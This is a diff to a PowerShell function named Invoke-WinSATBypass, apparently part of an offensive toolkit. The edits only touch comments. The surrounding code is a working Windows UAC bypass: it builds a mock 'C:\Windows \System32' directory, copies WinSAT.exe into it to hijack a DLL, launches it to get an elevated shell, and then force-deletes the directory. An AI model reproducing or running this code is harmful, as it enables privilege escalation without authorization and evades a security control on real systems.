@@ -40,7 +40,7 @@ function Invoke-WinSATBypass
     $uacBypassCMD = "C:\Windows \System32\WinSAT.exe";
     $downloadSucceed = $false;
 
-    # Creates Mock Directory that will be use for DLL Hijacking
+    # Creates a Mock Directory that will be use for DLL Hijacking
     Write-Output "[+] Creating mock directory: $mockDirectory";
     New-Item "$mockDirectory" -ItemType Directory | Out-Null ;
     timeout 1 | Out-Null ;
@@ -63,12 +63,12 @@ function Invoke-WinSATBypass
         Write-Output "[+] Copying WinSAT.exe in mock directory: $mockDirectory";
         cp C:\Windows\System32\WinSAT.exe "$uacBypass";
         
-        # Execute WinSAT.exe and get and elevated shell
+        # Execute WinSAT.exe and get an elevated shell
         Write-Output "[+] Launching UAC Bypass: $uacBypass";
         cmd.exe /c $uacBypassCMD
     }
 
-    # Removes the mock directory
+    # Removes the mock directory recursively
     Write-Output "[+] Removing mock directory: $mockDirectory";
     Remove-Item "\\?\C:\Windows \" -Recurse -Force;
 }
